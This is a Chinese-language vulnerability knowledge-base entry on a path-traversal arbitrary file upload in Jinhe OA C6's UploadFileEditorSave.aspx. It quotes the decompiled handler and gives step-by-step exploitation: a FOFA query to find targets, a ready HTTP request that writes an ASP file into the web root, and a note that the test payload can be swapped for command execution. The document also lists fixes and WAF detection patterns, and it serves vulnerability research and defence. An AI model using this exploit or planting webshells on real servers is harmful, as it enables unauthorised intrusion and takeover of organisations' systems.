---
id: web-generic-file-upload-jhsoft-uploadfileeditorsave-path-traversal-asp
title: 金和 OA C6 UploadFileEditorSave.aspx 的 filename 路径穿越 + 无类型校验：上传 ASP WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: jhsoft-uploadfileeditorsave-path-traversal-asp-webshell
tags:
- web
- file-upload
- path-traversal
- asp
- dotnet
- jhsoft
- webshell
- dnspy
cve: []
severity: critical
confidence: high
affected_versions: 金和 OA C6 v3.8 之前
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:28:36+08:00'
  notes: 已对照原文核对：UploadFileEditorSave.Page_Load 的 filename→MapFilePath→slaves 分支 NoAESRead/AESRead、AESRead 仅加密不校验扩展名、POST filename=\....\....\C6\ilra9c2tw2.asp 的 multipart 请求与 IIS/10.0 200 响应截图、访问 /C6/qps4cckjuz2.asp 均一致；受影响版本 v3.8 之前一致。未验证点：图 17 为打码页面，666 回显由原文文字佐证；AES 分支未展开。
url: /docs/web/generic/file-upload/web-generic-file-upload-jhsoft-uploadfileeditorsave-path-traversal-asp/
draft: false
kb_aliases:
- 金和OA 任意文件上传
- UploadFileEditorSave.aspx
- JHSoft.Web.CustomQuery
- Upload.MapFilePath
- NoAESRead
- AESRead
- 金和 OA 上传 WebShell
---

## 一句话结论

金和 OA C6 的 `UploadFileEditorSave.aspx` 从请求参数 `filename` 取目标路径交给 `Upload.MapFilePath`，只检查路径中是否含 `slaves`，存在时把 `\temp\` 替换成 `\slaves\` 后调用 `AESRead`，否则直接 `NoAESRead` 把上传流写入该路径；全程不校验扩展名、不限制目录，攻击者用 `filename=\....\....\C6\<name>.asp` 做路径穿越，把 ASP WebShell 写到 Web 目录并直接访问执行，获取服务器权限。

## 原理

- 入口：`/C6/Control/UploadFileEditorSave.aspx?filename=<目标路径>`，multipart 上传文件放在 `Request.Files[0]`。
- 代码（dnSpy 反编译 `JHSoft.Web.CustomQuery.dll` 的 `JHSoft.Web.CustomQuery.UploadFileEditorSave`）：
  ```csharp
  protected void Page_Load(object sender, EventArgs e) {
      string text = base.Request["filename"].ToString();
      string text2 = Upload.MapFilePath(text);
      if (text.ToLower().IndexOf("slaves") == -1) {
          if (File.Exists(text2)) File.Delete(text2);
          Upload.NoAESRead(base.Request.Files[0].InputStream, ref text2);
      } else {
          text2 = text2.ToLower().Replace("\\temp\\", "\\slaves\\");
          if (File.Exists(text2)) File.Delete(text2);
          Upload.AESRead(base.Request.Files[0].InputStream, ref text2);
      }
      this.Context.Response.End();
  }
  ```
- `filename` 完全由请求控制；`Upload.MapFilePath(text)` 只做路径映射/拼接，没有把结果限制在固定上传根目录，也没有拒绝 `..\` 穿越。
- 分支判断只看 `text` 是否包含小写 `slaves`：不含则走 `NoAESRead`，直接把上传流原样写入；含 `slaves` 则把路径中的 `\temp\` 替换为 `\slaves\` 并走 `AESRead`（先 `Upload.AESEncrypt` 再写入）。
- `NoAESRead` 与 `AESRead` 都不检查扩展名、MIME、文件头或内容；`NoAESRead` 写入的内容就是原始上传内容，因此可以直接写入 `<% ... %>` ASP 代码。
- 目标路径 `\....\....\C6\ilra9c2tw2.asp` 通过多级 `..\` 从默认上传目录穿越到 `C6` Web 应用目录；文件落地后 IIS 按 `.asp` 解析执行。
- 原文反编译路径提示：`JHSoft.Web.CustomQuery.dll` → `JHSoft.Web.CustomQuery.UploadFileEditorSave`；也可全局搜索 `UploadFileEditorSave`。`Upload` 类（`JHSoft.Web.Upload`）包含 `MapFilePath`、`AESRead`、`NoAESRead`、`AESEncrypt` 等方法。

## 触发条件

- 目标运行金和 OA C6 v3.8 之前版本，暴露 `/C6/Control/UploadFileEditorSave.aspx`。
- Web 应用对 `C6` 目录或上传目录有写权限；IIS 允许执行 `.asp`（未禁用 ASP 或未把上传目录设为不可执行）。
- 无需认证即可访问该 aspx（文章复现未携带有效会话）。
- 攻击者能控制 multipart 请求体与 `filename` 查询参数。

## 利用步骤

1. 确认目标：FOFA `app="金和网络-金和OA"`，访问 `/C6/Control/UploadFileEditorSave.aspx` 确认存在。
2. 逆向确认：dnSpy 载入 `JHSoft.Web.CustomQuery.dll`，查看 `UploadFileEditorSave.Page_Load` 与 `Upload.MapFilePath`、`NoAESRead`、`AESRead`，确认无扩展名/目录限制。
3. 构造上传请求：`filename` 用 `\....\....\C6\<随机名>.asp`（多级 `..\` 穿越），multipart 文件内容放 ASP 代码（如 `<%response.write(333*2)%>`），文件名的 `filename="x.jpg"` 与 `Content-Type: image/png` 仅作伪装，服务端以查询参数 `filename` 为准。
4. 发送请求，观察 200 响应；服务端删除同名旧文件后写入。
5. 访问 `http://target/C6/<随机名>.asp`，页面输出 `666`（333*2）即证明 WebShell 执行；可替换为执行命令、读取文件等 ASP 代码。
6. 若走 `slaves` 分支：路径含 `slaves` 时内容会被 AES 加密，直接写 ASP 不可执行；应走不含 `slaves` 的 `NoAESRead` 分支，或分析 `AESEncrypt` 算法后构造可解密内容（原文未展开）。

## PoC

```http
POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\ilra9c2tw2.asp HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Content-Type: multipart/form-data; boundary=----umvtqrw8etdtcatpd8vq

------umvtqrw8etdtcatpd8vq
Content-Disposition: form-data; name="file"; filename="ilra9c2tw2.jpg"
Content-Type: image/png

<%response.write(333*2)%>
------umvtqrw8etdtcatpd8vq--
```

响应：

```text
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
```

访问 `http://target/C6/ilra9c2tw2.asp`（原文示例为 `/C6/qps4cckjuz2.asp`）返回 `666`，证明上传的 ASP 被执行。

## 变体与关联

- 同产品文件类漏洞：[[web-generic-file-inclusion-jhsoft-uploadfiledownloadnew-fcform-traversal]]（UploadFileDownloadNew 的 fcform 路径穿越）、[[web-generic-file-inclusion-jhsoft-downloadbgimage-path-read]]（DownloadBGImage 路径读取）、[[web-dotnet-jhsoft-editmain-arbitrary-file-write]]（JHSoft EditMain 任意文件写）。
- 变体要点：`filename` 可换其他相对路径写到不同 Web 子目录；`slaves` 分支会 AES 加密内容，若要利用需先逆向 `Upload.AESEncrypt` 的 key/IV/模式；`NoAESRead` 分支是直接的任意文件写。
- 同类 .NET `MapPath`/`MapFilePath` 路径穿越见 [[web-generic-file-inclusion-dotnet-ava-download-aspx-server-mappath]]。

## 检测与防御

- 代码修复：`filename` 不由客户端决定；服务端生成随机文件名并把结果强制限制在固定上传根目录内（`Path.GetFullPath` 后校验 `StartsWith(uploadRoot)`）；拒绝 `..`、绝对路径、 UNC 路径；扩展名白名单（图片/文档），同时校验 MIME 与文件头。
- 部署：上传目录设为不可执行（IIS 处理程序只允许静态文件），Web 目录与上传目录分离；禁用不需要的 ASP/ASPX 执行权限；应用账户最小权限。
- 监测：WAF 检测 `UploadFileEditorSave.aspx` 的 `filename` 含 `..\`、`\....\`、`.asp`、`.aspx`、`.ashx` 等；监控 Web 目录中新增的可执行脚本文件；对上传接口的异常 200 响应和随后对随机 `.asp` 的访问做关联告警。
- 版本升级：升级到金和 OA C6 v3.8 及以上（以厂商公告为准），并排查同类 `Upload.MapFilePath` 调用点。
